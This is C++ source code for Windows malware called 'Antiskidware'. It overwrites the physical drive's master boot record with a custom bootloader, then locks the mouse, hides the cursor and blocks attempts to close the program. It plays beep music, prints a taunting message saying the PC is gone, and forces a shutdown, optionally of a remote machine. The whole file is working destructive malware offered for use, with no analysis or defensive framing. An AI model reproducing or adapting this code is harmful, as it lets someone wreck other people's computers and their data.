#include <thread>
#include <vector>
#include <iostream>
#include <mutex>
#include <Windows.h>
#include <winuser.h>
#include <conio.h>

std::mutex mtx; //might be not working as excepted, idk if its useful, but it works.

struct
{
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[2];
} TP;

void overwrite_mbr(void)
{
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    HANDLE binary = CreateFileW(L"./bootloader.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    DWORD  size = GetFileSize(binary, 0); // Must be 512b

    byte* new_mbr = new byte[size];
    DWORD bytes_read;

    if (ReadFile(binary, new_mbr, size, &bytes_read, 0)) {
        WriteFile(drive, new_mbr, size, &bytes_read, 0);
    }

    delete [] new_mbr; //important !


    CloseHandle(binary);
    CloseHandle(drive);
}

void beep_music_thread()
{
    // Maybe..
    while (true) {
        Beep(440, 500);
        Beep(440, 500);
        Beep(440, 500);
        Beep(349, 350);
        Beep(523, 150);

        Beep(440, 500);
        Beep(349, 350);
        Beep(523, 150);
        Beep(440, 1000);

        Beep(659, 500);
        Beep(659, 500);
        Beep(659, 500);
        Beep(698, 350);
        Beep(523, 150);

        Beep(415, 500);
        Beep(349, 350);
        Beep(523, 150);
        Beep(440, 1000);

        Beep(880, 500);
        Beep(440, 350);
        Beep(440, 150);
        Beep(880, 500);
        Beep(830, 250);
        Beep(784, 250);

        Beep(740, 125);
        Beep(698, 125);
        Beep(740, 250);

        Beep(455, 250);
        Beep(622, 500);
        Beep(587, 250);
        Beep(554, 250);

        Beep(523, 125);
        Beep(466, 125);
        Beep(523, 250);

        Beep(349, 125);
        Beep(415, 500);
        Beep(349, 375);
        Beep(440, 125);

        Beep(523, 500);
        Beep(440, 375);
        Beep(523, 125);
        Beep(659, 1000);

        Beep(880, 500);
        Beep(440, 350);
        Beep(440, 150);
        Beep(880, 500);
        Beep(830, 250);
        Beep(784, 250);

        Beep(740, 125);
        Beep(698, 125);
        Beep(740, 250);

        Beep(455, 250);
        Beep(622, 500);
        Beep(587, 250);
        Beep(554, 250);

        Beep(523, 125);
        Beep(466, 125);
        Beep(523, 250);

        Beep(349, 250);
        Beep(415, 500);
        Beep(349, 375);
        Beep(523, 125);

        Beep(440, 500);
        Beep(349, 375);
        Beep(261, 125);
        Beep(440, 1000);
        Sleep(1000);
    }
}

void shutdownComputer(LPWSTR lpMachineName) {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TP.PrivilegeCount = 2;
        LookupPrivilegeValue(L"", SE_SHUTDOWN_NAME, &(TP.Privileges[0].Luid));
        TP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        LookupPrivilegeValue(L"", SE_REMOTE_SHUTDOWN_NAME,
            &(TP.Privileges[1].Luid));
        TP.Privileges[1].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, (PTOKEN_PRIVILEGES)&TP, 0, NULL,
            NULL);
    }

    if (InitiateSystemShutdownExW(lpMachineName, NULL, 0, TRUE, FALSE, SHTDN_REASON_MAJOR_HARDWARE)) {
        return;
    }
}

void console_anim_thread(int consoleMode, std::atomic<bool>* stop_threads, LPWSTR lpMachineName) {
    char message[] = "You have been get pwnd by the Antiskidware.\nStop be a skid and learn how to program.\n\nYour masterboot record partition (MBR) was overwritten ! You can say 'Goodbye' to your pc..\n\nhttps://github.com/Its-Vichy/Antiskidware";
    SetConsoleTitleA("How no pwnd :(, Have a fun to reinstalling an os");// imagine using system just to change the console title
    for (char& letter : message) {
        if (consoleMode == 4) {
            printf("\u001b[4m%c\u001b[24m", letter);
        }
        else {
            printf("%c", letter);
        }

        Sleep(40);
    }

    *stop_threads = true;

    shutdownComputer(lpMachineName); //this might work better than using system
 //   system("C:\\Windows\\System32\\shutdown /s /t 0");
}

void mouse_lock_thread(void) {
    while (true) {
        SetCursorPos(0, 0);
    }
}

int main(int argc, LPWSTR* argv)
{
    ShowCursor(FALSE);
    DWORD mode;
    GetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), &mode);

    LPWSTR lpMachineName = NULL;

    if (argc > 1)
        lpMachineName = argv[1];

 //   shutdownComputer(lpMachineName);

    // Overwrite before get fun (skid can close program before... (ho no ! the kid can't cuz the mouse was locked LMFAO))
    overwrite_mbr();
    std::atomic<bool> stop_threads = false;
    std::thread music_thread(beep_music_thread);
    std::thread anti_close_with_control_c = std::thread([&stop_threads]() {
        int lines = 0;
        while (stop_threads == false) {
            _getch();
            HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE); 
            mtx.lock();
            CONSOLE_SCREEN_BUFFER_INFO csbiInfo;
            GetConsoleScreenBufferInfo(consoleHandle, &csbiInfo);
                
            COORD toWrite = { 0, 10 + lines };
            SetConsoleCursorPosition(consoleHandle, toWrite);

            printf("stfu.");//funny
            SetConsoleCursorPosition(consoleHandle, csbiInfo.dwCursorPosition);
            lines++;
            mtx.unlock();
        }
        });
    std::thread console_thread(console_anim_thread, mode & ENABLE_VIRTUAL_TERMINAL_PROCESSING, &stop_threads, lpMachineName);
   std::thread mouse_lock_thread(mouse_lock_thread);


    console_thread.join();
    music_thread.join();
   mouse_lock_thread.join();

    return EXIT_SUCCESS;
}
